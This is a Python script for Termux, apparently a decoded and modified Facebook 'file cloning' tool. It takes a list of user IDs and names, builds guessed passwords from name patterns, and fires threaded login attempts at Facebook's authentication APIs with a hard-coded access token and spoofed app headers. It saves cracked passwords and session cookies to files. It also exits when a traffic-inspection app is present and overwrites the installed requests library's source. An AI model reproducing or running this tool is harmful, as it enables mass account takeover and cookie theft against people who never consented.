"DECODE BY SaLar KhAno"
"FIXED BY PriNce SaLar"
"DECODE TIME : 16 MARCH 2025"
"FIX TIME : 17 MARCH 2025"
#-------------------[ MODULE ]-------------------#
import requests,random,uuid,string,hashlib,json
import os,base64,zlib,pip,urllib,urllib3,platform,math
import smtplib,json,time,re,random,sys,re
import uuid,subprocess,string,datetime
try:
    from string import *
    from os import path
    from urllib.request import urlopen
    from datetime import datetime,timedelta
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    os.system('pip install requests futures==2 > /dev/null')
except:pass
#-------------------[ LOOP ]-------------------#
loop = 0;oks = [];cps = [];twf = [];pcp = [];id = [];tokenku = [];plist = [];user = [];methods = []
#-------------------[ COLOR ]-------------------#
G = '\x1b[1;32m';W = '\x1b[1;97m';R = '\x1b[38;5;160m';B = '\x1b[1;90m';Y = '\x1b[1;33m';T = '\x1b[1;34m';E = '\x1b[38;5;205m';O = '\x1b[38;5;81m'
#-------------------[ STYLE ]-------------------#
xd = f''' {R}[{W}={R}]{G}''';xd1 = f''' {R}[{W}1{R}]{G}''';xd2 = f''' {R}[{W}2{R}]{G}''';xd0 = f''' {R}[{W}0{R}]{G}''';xdx = f''' {R}[{W}?{R}]{G}'''
#-------------------[ CANARY-USER ]-------------------#
try:
    fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
    if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
        print(f'{xd} FOUND ERROR IN YOUR TERMUX');exit()
except:pass
#-------------------[ CLEAR ]-------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'''{R}{47*'-'}''')
#-------------------[ UA ]-------------------#
def ____useragent____():
    ____sexua____ = ['[FBAN/FB4A;FBAV/493.0.0.72.158;FBBV/457630896;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/Robi;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/RMX1941;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;],','[FBAN/FB4A;FBAV/502.0.0.66.79;FBBV/459420566;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/Airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/RMX2189;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]']
    ____ua____ = f'''[FBAN/FB4A;FBAV/{random.randint(11, 99)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};{random.choice(____sexua____)}'''
    return ____ua____
#-------------------[ LOGO ]-------------------#
logo = (f"""
\033[1;37m SSSSS    AAA   LL        AAA   RRRRRR  
\033[1;31mSS       AAAAA  LL       AAAAA  RR   RR 
\033[1;37m SSSSS  AA   AA LL      AA   AA RRRRRR  
\033[1;31m     SS AAAAAAA LL      AAAAAAA RR  RR  
\033[1;37m SSSSS  AA   AA LLLLLLL AA   AA RR   RR {G}[V {R}{W}0.1]
{R}{47*'-'}""")
#-------------------[ MAIN MENU ]-------------------#
def SALAR():
    clear();print(f"{xd} USERNAME    {R}:{W} \n{xd} EXPIRE DATE {R}:{W} \n{xd} YOUR TOKEN  {R}:{W} ");linex();print(f'''{xd1} START {R}[{W}FILE{R}]{G} CLONING ''');print(f'''{xd0} EXIT TOOLS BROH ''');linex();_p_o_c_o_ = input(f'''{xdx} SELECTION {R}:{W} ''')
    if _p_o_c_o_ in ['1']:____filemenu____()
    elif _p_o_c_o_ in ['0']:exit()
    else:linex();print(f'''{xd} OPTION NOT FOUND ''');linex();time.sleep(1);print(f'''{xd} TRY AGAIN ''');time.sleep(1);SALAR()
#-------------------[ FILE MENU ]-------------------#
def ____filemenu____():
    clear();print(f'''{xd} EXAMPLE {R}:{G} /sdcard/filename.txt ''');linex();file = input(f'''{xdx} ENTER FILE NAME {R}:{W} ''')
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
    	linex();print(f'{xd} FILE LOCATION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN BROTHER ");time.sleep(1);____filemenu____()
    clear();print(f'''{xd1} AUTO PASSWORD CLONING ''');print(f'''{xd2} MANUAL PASSWORD CLONING''');linex();ppp = input(f'''{xdx} SELECTION {R}:{W} ''')
    if ppp in ['1','01']:plist.append('firstslast');plist.append('first last');plist.append('first123');plist.append('first1234');plist.append('first12345');plist.append('first@123');plist.append('first@@##');plist.append('first1122');plist.append('last123');plist.append('Firstlast');plist.append('First last')
    else:
        try:
            clear();print(f'''{xd} EXAMPLE {R}:{G} BANGLADESH 5-30 {R}|{G} OTHERS 5-10''');linex()
            ps_limit = int(input(f'''{xdx} PASSWORDS LIMIT {R}:{W} '''))
        except:
            ps_limit = 5
        clear();print(f'''{xd} EXAMPLE {R}:{G} firstlast {R}|{G} first12 {R}|{G} first123 ''');linex()
        for i in range(ps_limit):plist.append(input(f'''{xd} PASSWORD NO{i + 1} {R}:{W} '''))
    clear();print(f'{xd1} METHOD M1 {R}[{W}API{R}] ');print(f'{xd2} METHOD M2 {R}[{W}GRAPH{R}] ');linex();method_choice = input(f'{xdx} SELECT METHOD {R}:{W} ')
    if method_choice in ['1', '01']:methods.append('M1')
    else:
        if method_choice in ['2', '02']:methods.append('M2')
    with tred(max_workers=30) as ___poco___:
        clear();total_ids = str(len(fo))
        print(f'{xd} TOTAL FILE UID {R}:{W} {total_ids} ');print(f'{xd} IF NO RESULT ON{R}|{G}OFF AIRPLANE MODE');print(f'{xd} YOUR CLONING STARTED{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}.');linex()
        for user in fo:
            ids, names = user.split('|')
            passlist = plist
            if 'M1' in methods:___poco___.submit(___methodM1___, ids, names, passlist)
            else:
                if 'M2' in methods:___poco___.submit(___methodM2___, ids, names, passlist)
    print('\x1b[1;37m');linex();print(f'''{xd} THE PROCESS HAS COMPLETED''');print(f'''{xd} TOTAL OK{R}|{G}CP {R}:{W} ''' + str(len(oks)) + f'''{R}|{W}''' + str(len(cps)));linex();exit()
#-------------------[ FILE METHOD M1 ]-------------------#
def ___methodM1___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{xd}{W}-{R}[{G}SALAR-M1{R}]{W}-{R}[{W}%s{R}]{W}-{R}[{G}%s{R}]{W}-{R}[{Y}%s{R}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'cpl': 'true','family_device_id': str(uuid.uuid4()),'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'device_based_login','email':ids,'password':pas,'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies':'1','meta_inf_fbmeta': '','advertiser_id': str(uuid.uuid4()),'currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                        headers = {'User-Agent': ____useragent____(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'''\r{xd}{W}-{R}[{G}SALAR-OK{R}]{G} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                                       #print(f'''\r{xd}{W}-{R}[{G}🍪{R}]{W} ''' + cookies);linex()
                                        open('/sdcard/SALAR-FILE-M1-OK.txt', 'a').write(ids + '|' + pas + '|' + cookies + '\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'''\r{xd}{W}-{R}[{Y}SALAR-CP{R}]{Y} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                                        open('/sdcard/SALAR-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-------------------[ FILE METHOD M2 ]-------------------#
def ___methodM2___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{xd}{W}-{R}[{G}SALAR-M2{R}]{W}-{R}[{W}%s{R}]{W}-{R}[{G}%s{R}]{W}-{R}[{Y}%s{R}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        _____useragentxx_____ = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
                        headers = {'User-Agent': _____useragentxx_____,'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': f'OAuth {accessToken}','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger','Content-Length': '332'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'''\r{xd}{W}-{R}[{G}SALAR-OK{R}]{G} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                                        #print(f'''\r{xd}{W}-{R}[{G}🍪{R}]{W} ''' + cookies);linex()
                                        open('/sdcard/SALAR-FILE-M2-OK.txt', 'a').write(ids + '|' + pas + '|' + cookies + '\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'''\r{xd}{W}-{R}[{Y}SALAR-CP{R}]{Y} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                                        open('/sdcard/SALAR-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-------------------[ ISSUE ]-------------------#
def issue():
    if os.path.isfile("/data/d"+"ata/com.ter"+"mux/files/u"+"sr/bin/rm"):pass
    else:system('clear');print(f'{xd} SYSTEM MODIFICATION NOT ALLOWED WARNING BY POCO GANG ');exit()
    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr"+"/bin/cp"):pass
    else:system('clear');print(f'{xd} SYSTEM MODIFICATION NOT ALLOWED WARNING BY POCO GANG ');exit()
    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/us"+"r/bin/mv"):pass
    else:system('clear');print(f'{xd} SYSTEM MODIFICATION NOT ALLOWED WARNING BY POCO GANG ');exit()
    if os.path.isfile("/data/d"+"ata/com.termu"+"x/files/usr/bi"+"n/termux-reset"):pass
    else:system('clear');print(f'{xd} SYSTEM MODIFICATION NOT ALLOWED WARNING BY POCO GANG ');exit()
    if os.path.isfile("/data/dat"+"a/com.termux/files/usr/"+"bin/term"+"ux-setup-storage"):pass
    else:system('clear');print(f'{xd} SYSTEM MODIFICATION NOT ALLOWED WARNING BY POCO GANG ');exit()
    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr/"+"bin/pip"):pass
    else:system('clear');print(f'{xd} SYSTEM MODIFICATION NOT ALLOWED WARNING BY POCO GANG ');exit()
    if os.path.isfile("/data/dat"+"a/com.termux/file"+"s/usr/bin"+"/pip3"):pass
    else:system('clear');print(f'{xd} SYSTEM MODIFICATION NOT ALLOWED WARNING BY POCO GANG ');exit()
    if os.path.isfile("/data/data/com"+".termux/files/"+"usr/bin/"+"pip3.12"):pass
    else:system('clear');print(f'{xd} SYSTEM MODIFICATION NOT ALLOWED WARNING BY POCO GANG ');exit()
#-------------------[ VERIFY ]-------------------#
site = '/da'+'ta/data/com.termu'+'x/files/usr/lib/python3.12/s'+'ite-packages/'
def verify():
    with open(f'{site}req'+'uests/sessi'+'ons.py', 'r') as file :
            filedata = file.read()
    filedata = filedata.replace('verify = False', 'verify = True')
    with open(f'{site}reque'+'sts/sessi'+'ons.py', 'w') as file:
        file.write(filedata)
    if "verify = True" in filedata:pass
    else:
        with open(f'{site}requ'+'ests/sess'+'ions.py', 'a') as file:
            file.write('\nverify = True\n')
    pass
#-------------------[ END ]-------------------#
if __name__ == "__main__":
    issue();verify();SALAR()
